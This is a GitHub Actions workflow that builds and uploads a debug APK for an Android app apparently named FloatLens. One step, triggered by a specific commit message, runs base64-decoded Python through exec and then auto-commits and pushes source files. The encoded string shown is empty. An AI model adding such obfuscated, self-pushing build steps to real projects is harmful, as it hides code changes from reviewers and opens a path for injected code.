name: Debug Build

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build-debug:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Apply configurable long-press migration
        run: |
          if [ "$(git log -1 --pretty=%s)" = "Fix temporary long-press patch runner" ]; then
            python3 -c "import base64;exec(base64.b64decode(''))"
            git config user.name "FloatLens Bot"
            git config user.email "actions@users.noreply.github.com"
            git add app/src/main/java/com/yagay/floatlens/FloatIconView.java app/src/main/java/com/yagay/floatlens/GestureActionMapper.java app/src/main/java/com/yagay/floatlens/SettingsActivity.java app/src/main/java/com/yagay/floatlens/FloatSettings.java app/build.gradle
            git commit -m "Make long press fully configurable in 3.0.27"
            git push
          fi

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '17'

      - name: Set up Gradle 9.4.1
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.4.1'

      - name: Build debug APK
        run: gradle --stacktrace assembleDebug

      - name: Upload debug APK
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: FloatLens-debug
          path: app/build/outputs/apk/debug/*.apk
          if-no-files-found: ignore
